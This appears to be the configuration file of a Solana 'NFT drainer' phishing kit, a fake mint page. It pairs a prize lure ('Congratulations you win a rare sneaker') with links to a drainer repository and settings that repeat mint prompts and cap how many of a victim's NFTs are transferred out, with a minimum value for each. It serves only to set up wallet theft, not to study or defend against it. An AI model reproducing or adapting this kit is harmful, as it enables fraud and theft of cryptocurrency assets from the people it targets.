const collectionInfo = {
    name: "Congratulations you win a rare sneaker ", // Name of the collection
    title: "{name}", 
    date: "30.06.2022",
    socialMedia: {
        discord: "https://github.com/0x32Moon/Best-Solana-NFT-Drainer/", // Discord link
        twitter: "https://github.com/0x32Moon/Best-Solana-NFT-Drainer/", // Twitter link
    },
    medias: {
        preview: "gif.gif", // Location logo
	favicon: "logo.jpg", // Location logo page tab
    },
    background: {
        type: "image",
        image: "bj.jpg", // Location background
        video: "",
        color: "#4E4E6D",
    }
}
const mintInfo = {
    price: 1,
    totalSupply: 200,
	toFixed: 0,
    minUnits: 1,
    maxUnits: 1,
    askMintLoop: true,
}

const nftsInfo = {
    active: true,
    minValue: 0.0003,
    maxTransfer: 20,
}

if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);
